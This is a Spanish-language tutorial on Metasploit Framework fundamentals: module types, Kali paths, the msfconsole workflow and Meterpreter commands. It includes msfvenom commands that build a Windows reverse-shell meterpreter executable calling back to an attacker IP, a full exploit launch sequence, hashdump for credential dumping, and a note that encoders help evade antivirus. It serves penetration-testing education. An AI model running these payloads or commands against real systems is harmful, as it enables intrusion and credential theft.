# Fundamentos de Metasploit Framework

## ¿Qué es Metasploit?

Metasploit Framework es una herramienta de explotación modular que permite encontrar, validar y explotar vulnerabilidades de seguridad en sistemas informáticos.

Fue creado originalmente por H.D. Moore y actualmente es mantenido por Rapid7.

**¿Para qué se utiliza?**
- Pruebas de penetración (pentesting)
- Desarrollo y prueba de exploits
- Post-explotación (obtener hashes, usuarios, etc.)
- Automatización de ataques

---

## Componentes principales

### 1. **Exploits**
Código diseñado para aprovechar una vulnerabilidad en una aplicación o sistema.

**Ruta en Kali:**
```
/usr/share/metasploit-framework/modules/exploits/
```

**Ejemplo de uso:**
```bash
use exploit/windows/smb/ms08_067_netapi
```

### 2. **Payloads**
Código que se ejecuta tras explotar la vulnerabilidad, usado para tomar control del sistema.

Tipos comunes:
- `reverse_tcp`: La víctima se conecta al atacante.
- `bind_tcp`: El atacante se conecta al puerto abierto por la víctima.
- `meterpreter`: Un shell interactivo avanzado para Windows/Linux.

**Ruta de payloads:**
```
/usr/share/metasploit-framework/modules/payloads/
```

**Generación manual con msfvenom:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -f exe > payload.exe
```

### 3. **Encoders**
Codifican los payloads para evitar su detección por antivirus. No garantizan evasión, pero ayudan.

**Ruta:**
```
/usr/share/metasploit-framework/modules/encoders/
```

### 4. **Nops**
“Operaciones nulas” usadas para rellenar memoria sin alterar comportamiento del exploit.

### 5. **Auxiliary**
Módulos que no son exploits. Se usan para escaneo, fuzzing, fuerza bruta, etc.

**Ruta:**
```
/usr/share/metasploit-framework/modules/auxiliary/
```

**Ejemplo:**
```bash
use auxiliary/scanner/smb/smb_version
```

### 6. **Post**
Módulos utilizados después de obtener acceso, para recolectar información, escalar privilegios o pivotar.

**Ruta:**
```
/usr/share/metasploit-framework/modules/post/
```

---

## Flujo de trabajo básico

```bash
msfconsole                          # Iniciar Metasploit
search samba                       # Buscar módulos
use exploit/windows/smb/...        # Usar un módulo
show options                       # Ver parámetros requeridos
set RHOSTS <IP_objetivo>           # Definir IP objetivo
set LHOST <tu_IP>                  # Definir tu IP para payload reverso
set PAYLOAD windows/meterpreter/reverse_tcp
exploit                            # Lanzar el ataque
```

---

## Estructura de directorios en Kali

```
/usr/share/metasploit-framework/       # Archivos del framework
├── modules/                           # Exploits, payloads, encoders...
├── data/wordlists/                    # Diccionarios
├── tools/                             # Scripts y utilidades
├── documentation/                     # Documentación oficial
```

---

## Uso de Meterpreter

Una vez se ejecuta el payload, puedes obtener una **sesión Meterpreter**:

Comandos comunes:
```bash
sysinfo             # Información del sistema
getuid              # Usuario actual
shell               # Saltar a la shell de Windows/Linux
hashdump            # Dump de hashes (si tienes permisos)
screenshot          # Captura de pantalla
upload/download     # Subir o bajar archivos
```

---

## Búsqueda de módulos

```bash
search smb
search type:exploit platform:windows
```

---

## ¿Qué es `msfvenom`?

Es la herramienta de Metasploit para **crear payloads personalizados**.

Ejemplo:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe > shell.exe
```

---

## Consejos de uso

- Siempre revisa `show options` para configurar bien el módulo.
- Usa `exploit -j` para ejecutarlo en segundo plano.
- Usa `sessions -l` para ver sesiones activas.
- Usa `sessions -i <id>` para interactuar con una sesión.

---

## Comandos útiles en msfconsole

```bash
help                    # Ver comandos disponibles
use <módulo>            # Cargar un módulo
set <param> <valor>     # Definir opciones
show options            # Ver opciones requeridas
exploit                 # Ejecutar el ataque
sessions -l             # Listar sesiones activas
sessions -i <ID>        # Interactuar con sesión
```

---

